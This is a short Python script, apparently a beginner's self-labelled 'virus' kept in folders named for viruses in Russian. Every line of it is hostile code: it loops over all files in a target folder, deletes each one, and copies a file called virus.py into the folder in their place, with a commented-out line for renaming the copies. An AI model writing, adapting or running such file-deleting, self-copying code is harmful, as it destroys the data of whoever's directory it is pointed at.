import os
os.chdir("C:\питончик\вирусы\paposhka")
listok = os.listdir("C:\питончик\вирусы\paposhka")
i = 0
while i < len(listok):
    os.remove(listok[i])
    os.system("copy C:\питончик\вирусы\virus.py C:\питончик\вирусы\paposhka")
    # os.rename("virus.py","virus"+str(i)+".py")
    i += 1
    pass
